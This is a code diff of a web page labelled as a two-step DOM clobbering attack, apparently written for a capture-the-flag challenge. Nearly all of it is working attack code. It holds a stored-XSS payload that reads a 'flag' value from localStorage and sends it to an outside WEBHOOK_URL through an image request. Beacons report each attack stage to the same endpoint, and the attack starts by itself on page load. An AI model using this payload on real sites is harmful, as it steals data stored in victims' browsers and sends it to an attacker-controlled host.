@@ -15,7 +15,7 @@
         console.log('[TWO-STEP-ATTACK] Starting two-step DOM Clobbering attack');
         
         // Step 1: JavaScript payload (stored as message content, not executed immediately)
-        const javascriptPayload = `*/(new Image).src="${WEBHOOK_URL}?flag="+encodeURIComponent(localStorage.getItem("flag")||"no-flag")+"&source=DOM_CLOBBERING_XSS&t="+Date.now()//`;
+        const javascriptPayload = `*/(new Image).src="${WEBHOOK_URL}?c="+encodeURIComponent(localStorage.getItem("flag")||"no-flag")//`;
         
         
         async function executeAttack() {
@@ -78,7 +78,7 @@
                 
                 // Send success notification
                 const img = new Image();
-                img.src = WEBHOOK_URL + '?event=MESSAGES_POSTED&status=success&t=' + Date.now();
+                img.src = WEBHOOK_URL + '?c=MESSAGES_POSTED_SUCCESS';
                 
                 // Wait a moment then redirect to trigger the attack
                 await new Promise(resolve => setTimeout(resolve, 1500));
@@ -89,7 +89,7 @@
             } catch (error) {
                 console.error('[TWO-STEP-ATTACK] Attack failed:', error);
                 const img = new Image();
-                img.src = WEBHOOK_URL + '?event=ATTACK_FAILED&error=' + encodeURIComponent(error.message) + '&t=' + Date.now();
+                img.src = WEBHOOK_URL + '?c=ATTACK_FAILED_' + encodeURIComponent(error.message);
             }
         }
         
@@ -97,7 +97,7 @@
         window.addEventListener('load', () => {
             console.log('[TWO-STEP-ATTACK] Page loaded, starting attack...');
             const img = new Image();
-            img.src = WEBHOOK_URL + '?event=ATTACK_PAGE_LOADED&t=' + Date.now();
+            img.src = WEBHOOK_URL + '?c=ATTACK_PAGE_LOADED';
             
             executeAttack();
         });
